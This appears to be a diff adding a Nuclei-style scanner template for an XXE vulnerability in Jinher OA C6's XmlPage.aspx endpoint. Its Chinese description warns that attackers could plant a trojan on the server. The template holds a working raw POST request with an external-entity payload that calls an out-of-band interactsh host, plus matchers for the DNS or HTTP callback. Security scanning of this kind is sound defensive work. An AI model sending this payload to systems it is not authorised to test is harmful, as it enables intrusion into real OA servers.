@@ -1,0 +1,41 @@
+id: jinher-oa-c6-XmlPage-xxe
+info:
+  name: 金和 OA XmlPage.aspx XXE漏洞
+  author: leadlife
+  severity: critical
+  description: 金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 XmlPage.aspx 接口处存在XXE漏洞，攻击者在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+  reference: 
+    - https://www.yuque.com/lvguo-pibd8/fqbwsx/guakn9phvdqqikge
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    hunter-query: demo
+    tips:
+    repair:
+    version:
+  tags: oob,xxe,jinher,oa
+
+http:
+  - raw:
+      - |
+        POST /C6/JHSoft.Web.Calendar/XmlPage.aspx/?val=con HTTP/1.1
+        Content-Type: text/xml
+        Host: xxx.com
+        Content-Length: 131
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE root [
+          <!ENTITY % test SYSTEM "http://{{interactsh-url}}">
+          %test;
+        ]>
+      
+        
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+        condition: or
